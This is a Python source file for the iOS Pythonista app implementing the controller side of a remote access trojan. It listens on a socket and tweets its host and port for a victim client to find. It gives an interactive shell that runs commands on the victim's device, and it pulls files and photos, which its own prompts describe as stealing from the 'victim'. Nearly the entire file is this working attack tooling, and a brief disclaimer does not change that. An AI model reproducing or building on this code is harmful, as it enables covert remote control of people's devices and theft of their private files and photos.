# coding: utf-8

import socket
import twitter
import notification
import reminders
import os
import ui
import threading
import time
import sys
import sound
import console
import photos
import console
"""
I will update this to make it more functional and eay to use 
Use fing to find phone ip address
Do not use for malicious purposes
I am not responsible for what you do with this code

"""
class Server:
        #Overload is not totally functional right now and I am improving it soon
        def overload(self, output):
                errorOutput = console.alert("Error","Output too large!!!","Save to text file","Don't show reponse")

                if errorOutput == 1:
                        f = open('output.txt','wb')
                        f.write(output)
                        f.close()

                        return True
                elif errorOutput == 2:
                        NoShow = True
                        return True
                else:
                        print('you didnt select an option')
                        overload(output)

    #Will notify the user when the connection has succeeded
        def notify(self,addr):

                nuffsaid = "Connection from {}".format(addr)
                the_sound = sound.play_effect('arcade:Coin_1',1.0)
                x = notification.schedule(nuffsaid,0,str(the_sound))
                return True
    #posts to twitter
        def twittfunc(self,user):

                myacc = twitter.get_account(user)
                try:
                        twitter.post_tweet(myacc,'{}*{}'.format(host,port))
                        print('Tweet Successful')
                except:
                        print('An error occured')
                imdone = True
                runcode.connect()
    #Photo Transfer
        def transmyphoto(self,conn,command):
                conn.send(command)
                f = open('thestolenpic.jpg','wb')
                while True:
                        bits = conn.recv(1024)
                        if 'Unable to find the file' in bits:
                                print '[-] Unable to find the file'
                                break
                        if bits.endswith('DONE'):
                                print '[+] Transfer completed '
                                f.close()
                                break
                        f.write(bits)
    #File Transfer
        def transfer(self,conn,command):
                conn.send(command)
                f = open('robber.txt','wb')
                while True:
                        bits = conn.recv(1024)
                        if 'Unable to find the file' in bits:
                                print '[-] Unable to find the file'
                                break
                        if bits.endswith('DONE'):
                                print '[+] Transfer completed '
                                f.close()
                                break
                        f.write(bits)

        def connect(self):

                if imdone == True:
                        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        s.bind((host,port))
                        s.listen(5)
                        print('listening for an incoming connection on {} {}'.format(host,port))
                        print("Use 'grab*filepath.txt' to steal a file from victim")
                        print("Use code word 'stop' to terminate the connection")
                        print("Use 'photo*filepath.jpg'to steal a photo")
                        conn, addr = s.accept()


                        print("revieved connection")
                        runcode.notify(addr)
                        while True:

                                command= raw_input('Shell> ')
                                if 'stop' in command:
                                        print("Ending connection...")
                                        conn.send('stop')
                                        conn.close()
                                        print("Connection ended")
                                        break
                                elif 'grab' in command:
                                        runcode.transfer(conn,command)
                                elif 'photo' in command:
                                        runcode.transmyphoto(conn,command)

                                        return

                                else:
                                        NoShow = False
                                        conn.send(command)
                                        output = str(conn.recv(1024))
                                        if len(output) >= 1000:
                                                runcode.overload(output)
                                                if True:
                                                        NoShow = True

                                                else:
                                                        NoShow = True

                                        else:
                                                if NoShow == True:
                                                        output =''
                                                else:
                                                        print(output)
                        else:
                                print("Connection exited unexpectedly ")


def main():
        global runcode
        global host
        global port
        global user
        global imdone
        global NoShow

        NoShow = False
        imdone = True
        runcode = Server()
        host = raw_input("host ")
        port= input('Port? ')
        user = raw_input('Username : ')
        runcode.twittfunc(user)

main()
